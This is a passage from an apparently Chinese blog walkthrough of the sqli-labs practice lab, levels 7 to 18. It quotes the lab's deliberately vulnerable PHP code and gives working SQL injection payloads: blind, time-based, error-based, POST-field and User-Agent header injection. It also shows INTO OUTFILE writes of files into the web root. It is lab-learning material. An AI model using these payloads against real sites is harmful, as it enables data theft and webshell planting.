class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>双括号，还没有回显，那只能sqlmap了。<br>假设试出了双括号，设置 <code>id=-1&#39;))</code>，那就可以布尔盲注入了，具体参考level-5布尔注入<br>这里只测试库名长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">7</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or 1=1%23  成功通过，存在布尔注入</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-7/?id=-1&#x27;</span>)) <span class="keyword">or</span> length(database())=<span class="number">8</span>%<span class="number">23</span>  得到库名长度</span><br></pre></td></tr></table></figure><p>根据名字提示可以写入木马文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">7</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;)) union select 1,0x74657374,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\test.php&quot; %23</span></span><br></pre></td></tr></table></figure><p><code>0x74657374</code>是<code>test</code>的ascii，结果如下：<br><img src="/2022/02/17/sqli-labs/2022-02-20-10-10-51.png"><br>提示：<br>mysql写入文件需要打开secure_file_priv</p><ul><li><p>ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</p></li><li><p>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</p></li><li><p>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p></li></ul><p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv &#x3D;</p><p>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv &#x3D;<br>然后重启mysql即可</p><p><strong>参考：</strong> </p><ul><li><a href="https://segmentfault.com/a/1190000009333563">MYSQL新特性secure_file_priv对读写文件的影响</a>  </li><li><a href="https://shockerli.net/post/mysql-secure-file-priv/">MySQL 全局配置 –secure-file-priv</a>  </li><li><a href="https://www.cnblogs.com/tangjf10/p/12602116.html">sqli-labs：Less-7</a></li></ul><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p><strong>单引号-盲注</strong><br>爆字段数  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">8</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  order by 3%23</span></span><br><span class="line"><span class="string">```  </span></span><br><span class="line"><span class="string">1、文件写入  </span></span><br><span class="line"><span class="string">原理同`level-7`</span></span><br><span class="line"><span class="string">``` python</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span>  union select <span class="number">1</span>,<span class="number">0x74657374</span>,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-8\\test.php&quot;</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>2、布尔注入<br>原理同level-5，仅测试库名长度，不具体展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">8</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or length(database())=8  %23</span></span><br></pre></td></tr></table></figure><p>工具：<a href="https://github.com/HuDeshui/tools/blob/main/sqli_labs/sqli-labs-level-8.py"><strong>爆破脚本</strong></a></p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p><strong>基于时间-单引号-布尔-注入&#x2F;文件写入</strong><br>1、基于时间的布尔注入<br>原理类似于基于报错，这里只一个爆数据库长度的语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and if((length(database())=8),sleep(2),null) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-9/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>((payload),sleep(<span class="number">2</span>),null) %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>2、文件写入<br>可以先用布尔盲注测出当前表的字段数，然后使用union写如文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hhttp://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;  union select 1,0x74657374,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-9\\test.php&quot; %23</span></span><br></pre></td></tr></table></figure><p>本来想用下面语句中的payload写入文件，但是一直不成功，理解为<code>into outfile PATH</code>是最后结果的输出，不能用在语句中间，所以还是要结合<code>union</code>联合输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">9</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and if(1,(payload),null) %23</span></span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p><strong>基于时间-双引号-布尔-注入&#x2F;文件写入</strong><br>同level-9，不过换成双引号了，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">10</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot; and if((length(database())=8),sleep(2),null)%23</span></span><br></pre></td></tr></table></figure><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p><strong>POST型-单引号-有回显-注入</strong>  </p><p>简单测试一下<br>username&#x3D;a’,password&#x3D;b’<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;b&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>可以猜出后台的语句就是很直接的那种，查看后台代码，确实</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>类似于level-1，闭合语句就可以<br>burp抓包测试<br>爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;or 1 order by 1 #&amp;passwd=b&amp;submit=Submit  爆出字段数2</span></span><br><span class="line"><span class="string">后端加工之后</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=&#x27;</span><span class="number">1</span><span class="string">&#x27;or 1 order by 1 #&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;b&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> 成功绕过</span><br></pre></td></tr></table></figure><p>爆数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">uname=-<span class="number">1</span><span class="string">&#x27; union select 1,2 #&amp;passwd=b&amp;submit=Submit</span></span><br><span class="line"><span class="string">后端加工后</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=&#x27;</span>-<span class="number">1</span><span class="string">&#x27; union select 1,2 #&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;b&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> </span><br><span class="line">回显，可以看书<span class="number">1</span>，<span class="number">2</span>都可利用</span><br><span class="line">&lt;br&gt;Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span>&lt;br&gt;</span><br></pre></td></tr></table></figure><p>后面同理前面的level，不细致展开了</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p><strong>POST型-双引号-单括号-有回显-注入</strong><br>简单测试<br><code>uname=a&quot;&amp;passwd=b&#39;#&amp;submit=Submit</code><br>回显,根据之前总结的规律，看出就是id加双引号加单括号，用a验证，看了后台确实是<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;b&#39;#&quot;) LIMIT 0,1&#39; at line 1</code><br>爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&quot;)or 1 order by 1#&amp;passwd=b&#x27;#&amp;submit=Submit 爆出字段数为2</span></span><br><span class="line"><span class="string">后端sql</span></span><br><span class="line"><span class="string">SELECT username, password FROM users WHERE username=(&quot;</span>a<span class="string">&quot;)or 1 order by 1#&quot;</span>) <span class="keyword">and</span> password=(<span class="string">&quot;b&#x27;#&quot;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>查看可利用字段，爆数据库名 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a&quot;) union select 1,database()#&amp;passwd=b&#x27;#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>下面就和前面的level一样了，不细致展开了</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p><strong>POST型-双引号-单括号-无回显-布尔&#x2F;报错注入</strong><br>分析报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&#x27;&amp;passwd=b&#x27;</span><span class="comment">#&amp;submit=Submit</span></span><br><span class="line">回显，根据规律得出，后端加单引号，单括号</span><br><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;b&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br></pre></td></tr></table></figure><p>所以和之前一样了   </p><p>1、报错注入<br><strong>floor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显，具体不展开和之前一样</span></span><br><span class="line"><span class="string">Duplicate entry &#x27;</span>~security~<span class="number">1</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>updatexml</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or updatexml(1,concat(0x7e,(database()),0x7e),1)#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~security~<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or extractvalue(1, concat(0x7e,(database()),0x7e))#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~security~<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>2、布尔注入<br>仅作库名长度演示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or length(database())=8#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">回显，这里查看源码成功的图片名是/images/flag.jpg，失败的为 /images/slap.jpg</span></span><br><span class="line"><span class="string">可以根据文件名逐一爆破，不一一展开，和之前一样。</span></span><br></pre></td></tr></table></figure><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p><strong>POST型-双引号-无回显-布尔&#x2F;报错注入</strong>   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&quot;&amp;passwd=2&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显，推断后端加了双引号</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;2&quot;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>和level-13原理一样，只是后端少加了单括号，不细致展开。</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p><strong>POST型-单引号-无回显-布尔&#x2F;时间盲注&#x2F;文件写入</strong><br>这里发现可以布尔注入就一定可以时间盲注，这里因为成功&#x2F;失败图片名不一样，用布尔更快一些<br>猜测后台加工：加单引号，测试<code>username=a&#39; or 1#</code> ，回显成功<br>1、布尔&#x2F;时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data </span><br><span class="line">布尔：</span><br><span class="line">uname=a<span class="string">&#x27; or length(database())=8#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"><span class="string">时间盲注：</span></span><br><span class="line"><span class="string">uname=a&#x27;</span> <span class="keyword">or</span> <span class="keyword">if</span>((length(database())=<span class="number">8</span>),sleep(<span class="number">2</span>),null)<span class="comment">#&amp;passwd=a&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>2、文件写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&#x27; union select 1,0x7e into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-15\\test.txt&quot;#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test.txt内容</span></span><br><span class="line"><span class="string">1~</span></span><br></pre></td></tr></table></figure><p>具体不展开，和之前一样</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p><strong>POST型-双引号-单括号-无回显-布尔&#x2F;时间盲注&#x2F;文件写入</strong><br>同level-15，把id改一下即可，后端加工为 添加 <code>&quot;)</code>，不具体展开了</p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><p><strong>有转义-update函数-单引号-布尔&#x2F;报错注入</strong><br>这一级用了新函数，要update<br>我们看一下后端关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  <span class="comment">#check_input会转义单引号，所以admin不好利用</span></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]; <span class="comment">#passwd没有被转义</span></span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  </span><br><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是闭合update语句，这里仅展示爆数据库名长度，后面不一一展示<br>1、报错注入<br>floor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)#&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Duplicate entry &#x27;</span>~security~<span class="number">1</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>updatexml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1)#&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">&gt;XPATH syntax error: &#x27;</span>~security~</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e))#&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">&gt;XPATH syntax error: &#x27;</span>~security~</span><br></pre></td></tr></table></figure><p>2、时间盲注<br>仅展示爆数据库长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or if(length(database()=8),sleep(2),null)#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h3><p><strong>请求头（User-Agen）-注入-报错&#x2F;时间注入</strong><br>看了后端源码，加了过滤，只能注入hear里的user-agent<br>关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br></pre></td></tr></table></figure><p>可控的是<code>uagent</code> 、<code>uname</code>,uname因为必须是表里的，所以不能利用，可以利用uagent即        <code>HTTP_USER_AGENT</code>  </p><p>分析语句,拼接,这里本以为报错注入只需要把句子放在最后就行了，发现不行<br>只有放在参数位置才可以产生报错<br>1、报错注入 ，仅爆库名<br><strong>floor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27; or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27; or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">Duplicate entry <span class="string">&#x27;~security~1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>updatexml</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">&gt;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">&gt;XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or 